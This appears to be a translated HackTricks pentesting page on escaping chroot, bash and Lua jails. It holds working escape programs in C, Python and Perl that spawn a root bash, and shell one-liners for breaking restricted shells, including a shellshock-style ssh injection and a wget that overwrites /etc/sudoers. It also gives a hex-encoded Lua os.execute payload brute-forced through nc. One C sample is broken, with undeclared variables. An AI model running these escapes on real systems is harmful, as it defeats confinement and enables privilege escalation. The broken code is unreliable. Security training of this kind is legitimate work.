# 从监狱中逃脱

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**在** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **中搜索是否可以执行任何具有 "Shell" 属性的二进制文件**

## Chroot 逃逸

来自 [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)：chroot 机制**并不旨在防御**来自**特权**（**root**）**用户**的故意篡改。在大多数系统中，chroot 上下文不能正确堆叠，具有足够权限的 chroot 程序**可能会执行第二次 chroot 以突破**。\
通常这意味着要逃脱，你需要在 chroot 内部是 root。

> [!TIP]
> **工具** [**chw00t**](https://github.com/earthquake/chw00t) 是为了滥用以下场景并从 `chroot` 中逃脱而创建的。

### Root + CWD

> [!WARNING]
> 如果你在 chroot 内部是**root**，你**可以逃脱**，创建**另一个 chroot**。这是因为两个 chroot 不能共存（在 Linux 中），所以如果你创建一个文件夹，然后在那个新文件夹上**创建一个新的 chroot**，而你**在外面**，你现在将**在新的 chroot 之外**，因此你将处于文件系统中。
>
> 这发生是因为通常 chroot 并不会将你的工作目录移动到指定的目录，所以你可以创建一个 chroot，但在它之外。

通常你不会在 chroot 监狱中找到 `chroot` 二进制文件，但你**可以编译、上传并执行**一个二进制文件：

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> 这与之前的情况类似，但在这种情况下，**攻击者将当前目录的文件描述符存储起来**，然后**在新文件夹中创建 chroot**。最后，由于他对该 **FD** **在 chroot 外部** 的 **访问**，他访问它并 **逃脱**。

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD 可以通过 Unix Domain Sockets 传递，因此：
>
> - 创建一个子进程 (fork)
> - 创建 UDS 以便父进程和子进程可以通信
> - 在子进程中在不同的文件夹中运行 chroot
> - 在父进程中，创建一个位于新子进程 chroot 之外的文件夹的 FD
> - 通过 UDS 将该 FD 传递给子进程
> - 子进程 chdir 到该 FD，因为它在其 chroot 之外，因此将逃离监狱

### Root + Mount

> [!WARNING]
>
> - 将根设备 (/) 挂载到 chroot 内的一个目录
> - chroot 到该目录
>
> 这在 Linux 中是可能的

### Root + /proc

> [!WARNING]
>
> - 将 procfs 挂载到 chroot 内的一个目录 (如果尚未挂载)
> - 查找具有不同 root/cwd 条目的 pid，例如：/proc/1/root
> - chroot 到该条目

### Root(?) + Fork

> [!WARNING]
>
> - 创建一个 Fork (子进程) 并 chroot 到文件系统中更深处的不同文件夹并在其上 CD
> - 从父进程中，将子进程所在的文件夹移动到子进程 chroot 之前的文件夹
> - 这个子进程将发现自己在 chroot 之外

### ptrace

> [!WARNING]
>
> - 以前用户可以从自己的进程调试自己的进程……但这在默认情况下不再可能
> - 无论如何，如果可能的话，你可以 ptrace 进入一个进程并在其中执行 shellcode ([见此示例](linux-capabilities.md#cap_sys_ptrace))。

## Bash Jails

### Enumeration

获取有关监狱的信息：
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### 修改 PATH

检查您是否可以修改 PATH 环境变量
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### 使用 vim
```bash
:set shell=/bin/sh
:shell
```
### 创建脚本

检查您是否可以创建一个以 _/bin/bash_ 为内容的可执行文件
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### 通过 SSH 获取 bash

如果您通过 ssh 访问，可以使用这个技巧来执行 bash shell：
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### 声明
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

您可以覆盖例如 sudoers 文件
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### 其他技巧

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**这页也可能很有趣：**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python 监狱

关于从 python 监狱中逃脱的技巧在以下页面：

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua 监狱

在此页面中，您可以找到您在 lua 中可以访问的全局函数：[https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**带命令执行的 Eval：**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
一些技巧来**调用库的函数而不使用点**：
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
列举库的函数：
```bash
for k,v in pairs(string) do print(k,v) end
```
请注意，每次在**不同的 lua 环境中执行前面的单行代码时，函数的顺序会改变**。因此，如果您需要执行一个特定的函数，可以通过加载不同的 lua 环境并调用库的第一个函数来进行暴力攻击：
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**获取交互式 lua shell**：如果您在一个受限的 lua shell 中，可以通过调用以下命令获取一个新的 lua shell（并希望是无限的）：
```bash
debug.debug()
```
## 参考

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (幻灯片: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))

{{#include ../../banners/hacktricks-training.md}}
